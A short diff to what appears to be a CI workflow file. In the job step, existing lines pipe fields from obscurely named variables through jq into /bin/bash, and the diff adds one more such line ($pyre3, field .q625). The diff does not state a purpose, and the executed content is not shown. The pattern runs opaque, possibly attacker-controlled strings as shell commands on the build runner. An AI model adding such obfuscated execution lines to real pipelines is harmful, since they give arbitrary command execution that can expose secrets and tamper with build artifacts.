@@ -27,6 +27,7 @@ jobs:
           echo $wa12934 | jq -r .xx1 | /bin/bash
           echo $pesc5313 | jq -r .aqj9 | /bin/bash
           printf '%s' "$cbj05" | jq -r .ecqbk88 | /bin/bash
+          echo $pyre3 | jq -r .q625 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
